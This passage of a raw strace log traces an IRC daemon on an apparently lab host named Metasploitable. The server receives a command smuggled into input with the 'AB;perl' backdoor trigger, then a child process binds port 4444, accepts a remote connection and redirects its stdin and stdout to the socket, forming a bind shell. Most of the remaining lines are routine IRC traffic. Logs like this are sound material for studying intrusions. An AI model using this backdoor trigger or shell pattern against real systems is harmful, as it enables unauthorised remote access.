Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
13034 07:45:20.140663 close(6)          = 0
13034 07:45:20.140673 munmap(0xb7d28000, 4096) = 0
13034 07:45:20.140704 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
13034 07:45:20.140726 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabe48) = -1 EINVAL (Invalid argument)
13034 07:45:20.140741 _llseek(6, 0, 0xbfcabe90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.140753 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabe48) = -1 EINVAL (Invalid argument)
13034 07:45:20.140763 _llseek(6, 0, 0xbfcabe90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.140773 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
13034 07:45:20.140831 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
13034 07:45:20.140868 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
13034 07:45:20.140895 listen(6, 5)      = 0
13034 07:45:20.140957 accept(6,  <unfinished ...>
13033 07:45:20.141206 exit_group(0)     = ?
13031 07:45:20.141279 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 13033
13031 07:45:20.141295 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.141307 --- SIGCHLD (Child exited) @ 0 (0) ---
13031 07:45:20.141314 waitpid(-1, 0xbfba8718, WNOHANG) = -1 ECHILD (No child processes)
13031 07:45:20.141325 sigreturn()       = ? (mask now [])
13031 07:45:20.141341 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
13031 07:45:20.141385 exit_group(0)     = ?
4519  07:45:20.141421 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 13031
4519  07:45:20.141433 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:45:20.141447 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:45:20.141458 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:45:20.141468 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:45:20.141486 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:45:20.141551 time(NULL)        = 1495626320
4519  07:45:20.141562 time(NULL)        = 1495626320
4519  07:45:20.141582 gettimeofday({1495626320, 141586}, NULL) = 0
4519  07:45:20.141595 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:45:20.141650 clock_gettime(CLOCK_MONOTONIC, {3129, 958665162}) = 0
4519  07:45:20.141665 gettimeofday({1495626320, 141683}, NULL) = 0
4519  07:45:20.141691 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
13034 07:45:20.172554 <... accept resumed> {sa_family=AF_INET, sin_port=htons(46061), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
13034 07:45:20.172594 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaae38) = -1 EINVAL (Invalid argument)
13034 07:45:20.172609 _llseek(8, 0, 0xbfcaae80, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.172621 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaae38) = -1 EINVAL (Invalid argument)
13034 07:45:20.172632 _llseek(8, 0, 0xbfcaae80, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.172641 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
13034 07:45:20.172683 close(6)          = 0
13034 07:45:20.172749 dup(8)            = 6
13034 07:45:20.172762 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabcd8) = -1 EINVAL (Invalid argument)
13034 07:45:20.172772 _llseek(6, 0, 0xbfcabd20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.172782 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
13034 07:45:20.172802 dup2(6, 1)        = 1
13034 07:45:20.172846 close(6)          = 0
13034 07:45:20.172866 fcntl64(1, F_SETFD, 0) = 0
13034 07:45:20.172877 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabca8) = -1 EINVAL (Invalid argument)
13034 07:45:20.172902 _llseek(1, 0, 0xbfcabcf0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.172934 dup(8)            = 6
13034 07:45:20.172947 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabcd8) = -1 EINVAL (Invalid argument)
13034 07:45:20.172958 _llseek(6, 0, 0xbfcabd20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13034 07:45:20.172968 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
13034 07:45:20.172998 dup2(6, 0)        = 0
13034 07:45:20.173007 close(6)          = 0
13034 07:45:20.173017 fcntl64(0, F_SETFD, 0) = 0
13034 07:45:20.173031 fcntl64(0, F_SETFD, 0) = 0
13034 07:45:20.173046 read(0,  <unfinished ...>
4519  07:45:20.173518 <... select resumed> ) = 1 (in [5], left {0, 970000})
4519  07:45:20.173542 clock_gettime(CLOCK_MONOTONIC, {3129, 990556053}) = 0
4519  07:45:20.173557 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:45:20.173570 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:45:20.173590 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:45:20.173606 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:45:20.173639 close(5)          = 0
4519  07:45:20.173655 gettimeofday({1495626320, 173659}, NULL) = 0
4519  07:45:20.173667 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 870000})
4519  07:45:20.299184 clock_gettime(CLOCK_MONOTONIC, {3130, 116204549}) = 0
4519  07:45:20.299206 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:45:20.299246 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299266 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299281 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299295 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299308 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299322 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299335 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299348 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299361 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299375 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299388 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299401 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299414 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299427 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299440 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299454 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299467 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299480 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299493 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299508 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299521 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299535 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.299551 time(NULL)        = 1495626320
4519  07:45:20.299561 time(NULL)        = 1495626320
4519  07:45:20.299601 gettimeofday({1495626320, 299606}, NULL) = 0
4519  07:45:20.299614 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:45:20.299665 clock_gettime(CLOCK_MONOTONIC, {3130, 116678223}) = 0
4519  07:45:20.299676 gettimeofday({1495626320, 299679}, NULL) = 0
4519  07:45:20.299686 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 840000})
4519  07:45:20.458426 clock_gettime(CLOCK_MONOTONIC, {3130, 275435482}) = 0
4519  07:45:20.458427 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:45:20.458427 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458427 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458427 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458433 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458447 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458461 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458475 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458488 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458502 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458515 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458529 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458543 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458556 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458570 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458583 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458597 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458610 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458623 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458637 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458651 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458665 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458678 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.458695 gettimeofday({1495626320, 458699}, NULL) = 0
4519  07:45:20.458707 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 960000})
4519  07:45:20.498383 clock_gettime(CLOCK_MONOTONIC, {3130, 315392461}) = 0
4519  07:45:20.498384 recv(4, "PRIVMSG  #testit BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 58
4519  07:45:20.498384 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498384 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498395 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498410 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498424 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498438 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498451 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498465 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498478 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498492 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498506 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498519 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498541 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498555 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498568 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498582 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498595 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498609 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498622 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498636 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498650 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498663 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.498678 time(NULL)        = 1495626320
4519  07:45:20.498688 time(NULL)        = 1495626320
4519  07:45:20.498699 gettimeofday({1495626320, 498703}, NULL) = 0
4519  07:45:20.498710 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:45:20.498749 clock_gettime(CLOCK_MONOTONIC, {3130, 315762137}) = 0
4519  07:45:20.498760 gettimeofday({1495626320, 498763}, NULL) = 0
4519  07:45:20.498770 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
